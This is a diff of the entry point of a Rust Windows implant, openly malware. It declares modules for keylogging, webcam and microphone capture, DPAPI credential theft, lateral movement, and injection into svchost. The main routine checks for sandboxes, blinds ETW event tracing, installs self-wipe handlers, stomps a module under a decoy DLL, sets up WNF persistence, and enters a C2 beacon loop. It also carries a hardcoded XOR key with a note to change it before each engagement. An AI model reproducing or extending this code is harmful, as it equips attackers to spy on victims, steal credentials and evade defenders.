@@ -1,15 +1,14 @@
-//! main.rs — Entry point
+//! main.rs — Implant entry point
 //!
-//! Boot order:
-//!   1. ETW blind     — silence event tracing before any noisy API calls
-//!   2. Anti-detect   — VM/sandbox/debugger checks; abort if hostile env
-//!   3. Resolve fns   — walk ntdll/kernel32 exports for all needed fn ptrs
-//!   4. Selfdestruct  — register ctrl handler (wipe-on-SIGTERM)
-//!   5. Guardian      — spawn watchdog thread
-//!   6. VEH           — install exception handler (wipe-on-crash)
-//!   7. Stomp + spoof — stomp ntdll headers; init stack-spoof gadget
-//!   8. Post-shutdown — install WNF persistence channel
-//!   9. C2 loop       — connect and serve commands
+//! Boot sequence:
+//!   1. Anti-analysis checks (bail out if sandbox detected)
+//!   2. ETW blind
+//!   3. Ctrl handler + VEH installation
+//!   4. Guardian thread launch
+//!   5. Watchdog thread (obfuscated sleep cycle)
+//!   6. Module stomp
+//!   7. WNF persistence channel
+//!   8. C2 beacon loop (never returns)
 
 #![allow(non_snake_case, dead_code)]
 #![windows_subsystem = "windows"]
@@ -19,7 +18,6 @@ mod c2;
 mod defs;
 mod dpapi;
 mod etw_patch;
-mod filetransfer;
 mod guardian;
 mod hashes;
 mod hollow;
@@ -27,7 +25,6 @@ mod indirect_syscall;
 mod keylog;
 mod lateral;
 mod loader;
-mod mic;
 mod pe_obfuscate;
 mod persist;
 mod post_shutdown;
@@ -38,8 +35,6 @@ mod screenshot;
 mod selfdestruct;
 mod sleep;
 mod spoof;
-#[cfg(feature = "ssn-audit")]
-mod ssn_audit;
 mod stomp;
 mod syscall;
 mod threadless_inject;
@@ -47,81 +42,82 @@ mod token;
 mod unhook;
 mod utils;
 mod watchdog;
+mod filetransfer;
+mod mic;
 mod webcam;
 
-// ── Guardian callback shims ───────────────────────────────────────────────────
-// Named unsafe fn items (not closures) so they can be cast to fn-pointer
-// types (FnVoid / FnBool).  Non-capturing closures *are* coercible to fn
-// pointers in Rust, BUT they cannot call other `unsafe fn` from within a
-// non-unsafe closure body.  Using named `unsafe fn` avoids that.
+#[cfg(feature = "ssn-audit")]
+mod ssn_audit;
 
-unsafe fn shim_wipe()     { selfdestruct::wipe_self(); }
-unsafe fn shim_purge()    { persist::purge_all(); }
-unsafe fn shim_drop_ads() { resurrect::drop_from_ads(); }
-unsafe fn shim_install()  { persist::install_all(); }
-unsafe fn shim_hollow() -> bool { hollow::run(&[]) }
+/// Shared XOR key: used by sleep.rs obfuscator and resurrect.rs ADS decrypt.
+/// Change before each engagement.
+pub static SLEEP_KEY: [u8; 16] = [
+    0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE,
+    0x01, 0x23, 0x45, 0x67, 0x89, 0xAB, 0xCD, 0xEF,
+];
 
 fn main() {
-    unsafe {
-        // 1. Silence ETW before any other API calls
-        etw_patch::apply_all_blinds();
+    unsafe { run() }
+}
 
-        // 2. Anti-detect: abort if hostile analysis environment
-        if antidetect::is_sandboxed() {
-            return;
-        }
-
-        // 3. Resolve function pointers from ntdll / kernel32 exports
-        let fn_ntqsi   = indirect_syscall::resolve_ntqsi();
-        let fn_sleep   = indirect_syscall::resolve_sleep();
-        let fn_tick    = indirect_syscall::resolve_tick();
-        let fn_add_veh = indirect_syscall::resolve_add_veh();
-
-        // 4. Register console ctrl handler (wipe on CTRL+C / forced close)
-        selfdestruct::register_ctrl_handler();
-
-        // 5. Spawn guardian watchdog thread
-        guardian::start_thread(
-            fn_ntqsi,
-            fn_sleep,
-            fn_tick,
-            shim_wipe,
-            shim_purge,
-            shim_drop_ads,
-            shim_install,
-            shim_hollow,
+unsafe fn run() -> ! {
+    // 1. Sandbox / anti-analysis gate
+    if antidetect::all_checks() {
+        winapi::um::processthreadsapi::TerminateProcess(
+            winapi::um::processthreadsapi::GetCurrentProcess(),
+            0,
         );
-
-        // 6. Install VEH (wipe-on-crash)
-        guardian::install_veh(fn_add_veh);
-
-        // 7a. Module stomp — hide our .text under xpsservices.dll
-        // First three &[u16] args (_decoy_dll, _spoof_name, _spoof_path) are
-        // ignored by stomp::stomp — it uses the hardcoded DECOY_NAME_W const.
-        // We pass empty slices as the correct type.
-        let _ = stomp::stomp(&[], &[], &[], &[]);
-
-        // 7b. Init stack-spoof gadget (must be after ntdll is in memory)
-        spoof::init_gadget();
-
-        // 8. Install WNF post-shutdown persistence channel
-        // install_wnf_channel(state_name, type_id, scope, permanent,
-        //                     data_size, data, security_descriptor)
-        post_shutdown::install_wnf_channel(
-            0x41C64E6D_u64,
-            core::ptr::null::<core::ffi::c_void>(),
-            core::ptr::null::<core::ffi::c_void>(),
-            0u32,
-            4usize,
-            core::ptr::null::<core::ffi::c_void>(),
-            0u32,
-        );
-
-        // 9. SSN audit (debug build only)
-        #[cfg(feature = "ssn-audit")]
-        ssn_audit::run();
-
-        // 10. C2 beacon loop
-        c2::run();
+        loop {}
     }
+
+    // 2. ETW blind
+    etw_patch::apply_all_blinds();
+
+    // 3. Ctrl handler + VEH
+    selfdestruct::register_ctrl_handler();
+    let fn_add_veh = indirect_syscall::resolve_add_veh();
+    // install_veh now takes (fn_add_veh, fn_destruct) — pass full_destruct
+    // so the VEH handler calls our proper wipe+terminate path.
+    guardian::install_veh(fn_add_veh, selfdestruct::full_destruct);
+
+    // 4. Guardian thread
+    let fn_ntqsi    = indirect_syscall::resolve_ntqsi();
+    let fn_sleep_ms = indirect_syscall::resolve_sleep();
+    let fn_tick     = indirect_syscall::resolve_tick();
+
+    guardian::start_thread(
+        fn_ntqsi,
+        fn_sleep_ms,
+        fn_tick,
+        selfdestruct::wipe_self,
+        persist::purge_all,
+        resurrect::drop_from_ads,
+        persist::install_all,
+        hollow::inject_svchost,
+    );
+
+    // 5. Watchdog thread (obfuscated sleep / beacon-health monitor)
+    watchdog::start(&SLEEP_KEY);
+
+    // 6. Module stomp
+    // stomp::stomp signature: (decoy_dll: &[u16], spoof_name: &[u16],
+    //                           spoof_path: &[u16], payload: &[u8])
+    // The fn internally uses a hardcoded decoy (xpsservices.dll); the
+    // first three &[u16] args are accepted but ignored.
+    // Pass empty slices — operator supplies real payload via C2.
+    stomp::stomp(&[], &[], &[], &[]);
+
+    // 7. WNF persistence channel
+    post_shutdown::install_wnf_channel(
+        0x41C64E6D_u64,
+        &[],
+        &SLEEP_KEY,
+        true,
+        true,
+        "C:\\Windows\\System32\\en-US\\shell32.dll",
+        0x4352_4344_u32,
+    );
+
+    // 8. C2 beacon loop (never returns)
+    c2::run()
 }
